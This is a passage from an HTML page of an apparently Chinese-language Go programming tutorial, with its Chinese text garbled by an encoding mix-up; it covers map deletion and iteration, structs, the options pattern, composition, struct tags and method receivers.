ä¹Ÿä¸ç­‰äºè‡ªèº«ï¼Œæ¯æ¬¡å“ˆå¸Œå€¼å°±ä¸åŒï¼Œæ‰€ä»¥ä¸è¦ç”¨ NaN ä½œä¸º map çš„é”®</p><h2 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h2><p>åˆ é™¤é”®å€¼å¯¹ï¼Œç”¨ <code>delete()</code> å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">delete</span>(<span class="hljs-keyword">map</span>,key)<br><span class="hljs-keyword">map</span>:è¦åˆ é™¤çš„ <span class="hljs-keyword">map</span><br>key:è¦åˆ é™¤çš„é”®å€¼å¯¹çš„ key<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br>fmt.Println(mp)<br><span class="hljs-built_in">delete</span>(mp, <span class="hljs-string">&quot;a&quot;</span>)<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[a:<span class="hljs-number">0</span> b:<span class="hljs-number">1</span> c:<span class="hljs-number">2</span> d:<span class="hljs-number">3</span>]<br><span class="hljs-keyword">map</span>[b:<span class="hljs-number">1</span> c:<span class="hljs-number">2</span> d:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>å¦‚æœå€¼ä¸º NaNï¼Œé‚£ä¹ˆæ²¡åŠæ³•åˆ é™¤é”®å€¼å¯¹</p><h2 id="éå†"><a href="#éå†" class="headerlink" title="éå†"></a>éå†</h2><p>ç”¨ <code>for range</code> éå† map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br><span class="hljs-keyword">for</span> key, val := <span class="hljs-keyword">range</span> mp &#123;<br>fmt.Println(key, val)<br>&#125;<br>&#125;<br>&gt;&gt;<br>c <span class="hljs-number">2</span><br>d <span class="hljs-number">3</span><br>a <span class="hljs-number">0</span><br>b <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å› ä¸º map æ˜¯æ— åºçš„ï¼Œéå†å‡ºæ¥ä¹Ÿæ˜¯æ— åºçš„</p><p>æŒ‰ç…§æŒ‡å®šé¡ºåºéå†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> scoreMap = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>key := fmt.Sprintf(<span class="hljs-string">&quot;%02d&quot;</span>, i)<br>value := rand.Intn(<span class="hljs-number">100</span>)<span class="hljs-comment">// ç”Ÿæˆ 0-99 çš„éšæœºæ•´æ•°</span><br>scoreMap[key] = value<br>&#125;<br><span class="hljs-comment">// å–å‡º map çš„æ‰€æœ‰ key å­˜å…¥åˆ‡ç‰‡ keys</span><br><span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> scoreMap &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, key)<br>&#125;<br><span class="hljs-comment">// å¯¹åˆ‡ç‰‡è¿›è¡Œæ’åº</span><br>sort.Strings(keys)<br><span class="hljs-comment">// æŒ‰ç…§æ’åºåçš„ key éå† map</span><br><span class="hljs-keyword">for</span> _, key := <span class="hljs-keyword">range</span> keys &#123;<br>fmt.Println(key, scoreMap[key])<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç»“æ„ä½“"><a href="#ç»“æ„ä½“" class="headerlink" title="ç»“æ„ä½“"></a>ç»“æ„ä½“</h1><p>ç»“æ„ä½“å£°æ˜ï¼Œå’Œä¸€èˆ¬ç»“æ„ä½“å£°æ˜ä¸€æ ·</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ç±»å‹å <span class="hljs-keyword">struct</span> &#123;<br>  å­—æ®µå å­—æ®µç±»å‹<br>  å­—æ®µå å­—æ®µç±»å‹<br>  â€¦<br>&#125;<br><br><span class="hljs-keyword">type</span> Programmer <span class="hljs-keyword">struct</span> &#123;<br>  Name     <span class="hljs-type">string</span><br>  Age      <span class="hljs-type">int</span><br>  Job      <span class="hljs-type">string</span><br>  Language []<span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®ä¾‹åŒ–"><a href="#å®ä¾‹åŒ–" class="headerlink" title="å®ä¾‹åŒ–"></a>å®ä¾‹åŒ–</h2><p>go æ²¡æœ‰æ„é€ æ–¹æ³•ï¼Œåˆå§‹åŒ–åƒ map ä¸€æ ·æŒ‡å®šå­—æ®µåç§°å†åˆå§‹åŒ–å­—æ®µå€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">programmer:=Programmer&#123;<br>Name:<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<br>Age:<span class="hljs-number">18</span>,<br>Job:<span class="hljs-string">&quot;stu&quot;</span>,<br>Language:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Go&quot;</span>,<span class="hljs-string">&quot;Java&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœå®ä¾‹åŒ–è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥ä½¿ç”¨å‡½æ•°æ¥å®ä¾‹åŒ–</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>  Name    <span class="hljs-type">string</span><br>  Age     <span class="hljs-type">int</span><br>  Address <span class="hljs-type">string</span><br>  Salary  <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int</span>, address <span class="hljs-type">string</span>, salary <span class="hljs-type">float64</span>)</span></span> *Person &#123;<br>  <span class="hljs-keyword">return</span> &amp;Person&#123;Name: name, Age: age, Address: address, Salary: salary&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°±åƒæ„é€ å‡½æ•°ï¼Œä½†æ˜¯ go ä¸æ”¯æŒå‡½æ•°ä¸æ–¹æ³•é‡è½½ï¼Œå¦‚æœéœ€è¦ç”¨å¤šç§æ–¹å¼å®ä¾‹åŒ–ç»“æ„ä½“ï¼Œè¦ä¹ˆåˆ›å»ºå¤šä¸ªæ„é€ å‡½æ•°ï¼Œè¦ä¹ˆä½¿ç”¨ options æ¨¡å¼</p><h2 id="options-æ¨¡å¼"><a href="#options-æ¨¡å¼" class="headerlink" title="options æ¨¡å¼"></a>options æ¨¡å¼</h2><p>å‡è®¾æœ‰ä¸€ä¸ªä¸‹é¢çš„ç»“æ„ä½“</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>  Name     <span class="hljs-type">string</span><br>  Age      <span class="hljs-type">int</span><br>  Address  <span class="hljs-type">string</span><br>  Salary   <span class="hljs-type">float64</span><br>  Birthday <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å£°æ˜ä¸€ä¸ª <code>PersonOptions</code> ç±»å‹ï¼Œæ¥æ”¶ä¸€ä¸ª <code>*Person</code> ç±»å‹çš„å‚æ•°ï¼Œå¿…é¡»æ˜¯æŒ‡é’ˆ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> PersonOptions <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºé€‰é¡¹å‡½æ•°ï¼Œä¸€èˆ¬æ˜¯ <code>With</code> å¼€å¤´ï¼Œè¿”å›å€¼ä¸ºä¸€ä¸ªé—­åŒ…å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithName</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Name = name<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithAge</span><span class="hljs-params">(age <span class="hljs-type">int</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Age = age<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithAddress</span><span class="hljs-params">(address <span class="hljs-type">string</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Address = address<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithSalary</span><span class="hljs-params">(salary <span class="hljs-type">float64</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Salary = salary<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®é™…å£°æ˜çš„æ„é€ å‡½æ•°ç­¾åï¼Œæ¥å—ä¸€ä¸ªå¯å˜é•¿çš„ <code>PersonOptions</code> ç±»å‹çš„å‚æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(options ...PersonOptions)</span></span> *Person &#123;<br>p:=&amp;Person&#123;&#125;<br><span class="hljs-keyword">for</span> _,option:=<span class="hljs-keyword">range</span> options&#123;<br>option(p)<br>&#125;<br><span class="hljs-keyword">if</span> p.Age&lt;<span class="hljs-number">0</span> &#123;<br>p.Age=<span class="hljs-number">0</span><br>&#125;<br>......<br><br><span class="hljs-keyword">return</span> p<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºä¸åŒå®ä¾‹åŒ–çš„éœ€æ±‚åªéœ€è¦ä¸€ä¸ªæ„é€ å‡½æ•°å°±è¡Œï¼Œä¼ å…¥ä¸åŒçš„ Options å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123;<br>p1:=NewPerson(<br>WithName(<span class="hljs-string">&quot;butt3rf1y&quot;</span>),<br>WithAge(<span class="hljs-number">18</span>),<br>WithAddress(<span class="hljs-string">&quot;US&quot;</span>),<br>WithSalary(<span class="hljs-number">100.00</span>),<br>)<br><br>p2:=NewPerson(<br>WithName(<span class="hljs-string">&quot;kikk&quot;</span>),<br>WithAge(<span class="hljs-number">19</span>),<br>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»„åˆ"><a href="#ç»„åˆ" class="headerlink" title="ç»„åˆ"></a>ç»„åˆ</h2><p>ç»“æ„ä½“ä¹‹é—´çš„å…³ç³»é€šè¿‡ç»„åˆæ¥è¡¨ç¤ºï¼Œæœ‰æ˜¾å¼ç»„åˆå’ŒåŒ¿åç»„åˆ</p><p>æ˜¾å¼ç»„åˆ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>p      Person<br>school <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> Employee <span class="hljs-keyword">struct</span> &#123;<br>p   Person<br>job <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦æ˜¾å¼çš„æŒ‡å®šå­—æ®µ p</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">student:=Student&#123;<br>p:Person&#123;name:<span class="hljs-string">&quot;jack&quot;</span>,age:<span class="hljs-number">18</span>&#125;,<br>school:<span class="hljs-string">&quot;lili school&quot;</span>,<br>&#125;<br>fmt.Println(student.p.name)<br></code></pre></td></tr></table></figure><p>åŒ¿åç»„åˆ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>Person<br>school <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> Employee <span class="hljs-keyword">struct</span> &#123;<br>Person<br>job <span class="hljs-type">string</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> user <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>&#125;<br>user.Name = <span class="hljs-string">&quot;hhah&quot;</span><br>user.Age = <span class="hljs-number">18</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v\n&quot;</span>, user)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">struct</span> &#123; Name <span class="hljs-type">string</span>; Age <span class="hljs-type">int</span> &#125;&#123;Name:<span class="hljs-string">&quot;hhah&quot;</span>, Age:<span class="hljs-number">18</span>&#125;<br></code></pre></td></tr></table></figure><p>åŒ¿åå­—æ®µåç§°é»˜è®¤ä¸ºç±»å‹åï¼Œè°ƒç”¨è€…å¯ä»¥ç›´æ¥è®¿é—®è¯¥ç±»å‹çš„å­—æ®µå’Œæ–¹æ³•</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">student:=Student&#123;<br>Person:Person&#123;name:<span class="hljs-string">&quot;jack&quot;</span>,age:<span class="hljs-number">18</span>&#125;,<br>school:<span class="hljs-string">&quot;lili school&quot;</span>,<br>&#125;<br>fmt.Println(student.name)<br></code></pre></td></tr></table></figure><h2 id="æŒ‡é’ˆ-1"><a href="#æŒ‡é’ˆ-1" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h2><p>ç»“æ„ä½“æŒ‡é’ˆä¸éœ€è¦è§£å¼•ç”¨å°±èƒ½è®¿é—®</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>&#125;<br>p := &amp;Person&#123;<br>name: <span class="hljs-string">&quot;hhah&quot;</span>,<br>age:  <span class="hljs-number">18</span>,<br>&#125;<br>fmt.Println(p.age, p.name)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>p.age</code> å…¶å®åœ¨ç¼–è¯‘æ—¶ä¼šè½¬æ¢ä¸º <code>(*p).name</code></p><h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><p>æ ‡ç­¾æ˜¯ç»“æ„ä½“çš„å…ƒä¿¡æ¯ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶é€šè¿‡åå°„çš„æœºåˆ¶è¯»å–</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-string">`key1:&quot;value1&quot; key2:&quot;value2&quot;`</span><br></code></pre></td></tr></table></figure><p>å‡å¦‚ Student ç»“æ„ä½“æ¯ä¸ªå­—æ®µå®šä¹‰ json åºåˆ—åŒ–æ—¶ç”¨ Tag:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>ID     <span class="hljs-type">int</span> <span class="hljs-string">`json:&quot;id&quot;`</span><br>Gender <span class="hljs-type">string</span><br>name   <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := Student&#123;<br>ID:     <span class="hljs-number">1</span>,<br>Gender: <span class="hljs-string">&quot;å¥³&quot;</span>,<br>name:   <span class="hljs-string">&quot;hhah&quot;</span>,<br>&#125;<br>data, err := json.Marshal(s1)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;json marshal failed&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, data)<br>&#125;<br>&gt;&gt;<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Gender&quot;</span>:<span class="hljs-string">&quot;å¥³&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•å’Œæ¥æ”¶è€…"><a href="#æ–¹æ³•å’Œæ¥æ”¶è€…" class="headerlink" title="æ–¹æ³•å’Œæ¥æ”¶è€…"></a>æ–¹æ³•å’Œæ¥æ”¶è€…</h2><p>æ–¹æ³•ï¼ˆMethodï¼‰æ˜¯ä½œç”¨äºç‰¹å®šç±»å‹å˜é‡çš„å‡½æ•°ï¼Œç‰¹å®šç±»å‹å˜é‡å«æ¥æ”¶è€… (Receiver) </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(Receiverå˜é‡ Receiverç±»å‹)</span></span> æ–¹æ³•å(å‚æ•°åˆ—è¡¨) (è¿”å›å‚æ•°)&#123;<br>å‡½æ•°ä½“<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int8</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int8</span>)</span></span> *Person &#123;<br><span class="hljs-keyword">return</span> &amp;Person&#123;<br>name: name,<br>age:  age,<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Dream() &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, p.name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;hhah&quot;</span>, <span class="hljs-number">18</span>)<br>p1.Dream()<br>&#125;<br>&gt;&gt;<br>hhah<br></code></pre></td></tr></table></figure><h3 id="æŒ‡é’ˆç±»å‹çš„æ¥æ”¶è€…"><a href="#æŒ‡é’ˆç±»å‹çš„æ¥æ”¶è€…" class="headerlink" title="æŒ‡é’ˆç±»å‹çš„æ¥æ”¶è€…"></a>æŒ‡é’ˆç±»å‹çš„æ¥æ”¶è€…</h3><p>ç”±äºæŒ‡é’ˆçš„ç‰¹æ€§ï¼Œè°ƒç”¨æ–¹æ³•æ—¶ä¿®æ”¹æ¥æ”¶è€…æŒ‡é’ˆçš„ä»»æ„æˆå‘˜å˜é‡ï¼Œæ–¹æ³•ç»“æŸåä¿®æ”¹ä¹Ÿæœ‰æ•ˆã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Person)</span></span> SetAge(newAge <span class="hljs-type">int8</span>) &#123;<br>p.age = newAge<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-number">18</span>)<br>fmt.Println(p1.age)<br>p1.SetAge(<span class="hljs-number">20</span>)<br>fmt.Println(p1.age)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">18</span><br><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬éœ€è¦ä¿®æ”¹æ¥æ”¶è€…ä¸­çš„å€¼æˆ–è€…å¦‚æœæŸä¸ªæ–¹æ³•ä½¿ç”¨äº†æŒ‡é’ˆæ¥æ”¶è€…æ—¶ç”¨æŒ‡é’ˆç±»å‹æ¥æ”¶è€…</p><h3 id="å€¼ç±»å‹çš„æ¥æ”¶è€…"><a href="#å€¼ç±»å‹çš„æ¥æ”¶è€…" class="headerlink" title="å€¼ç±»å‹çš„æ¥æ”¶è€…"></a>å€¼ç±»å‹çš„æ¥æ”¶è€…</h3><p>å½“æ–¹æ³•ç”¨äºå€¼ç±»å‹æ¥æ”¶è€…æ—¶ï¼Œä¼šåœ¨ä»£ç è¿è¡Œæ—¶å°†å€¼å¤åˆ¶ä¸€ä»½ã€‚åœ¨å€¼ç±»å‹æ¥æ”¶è€…çš„æ–¹æ³•ä¸­å¯ä»¥è·å–æ¥æ”¶è€…çš„æˆå‘˜å€¼ï¼Œä½†æ— æ³•æ”¹å˜æ¥æ”¶è€…æœ¬èº«</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 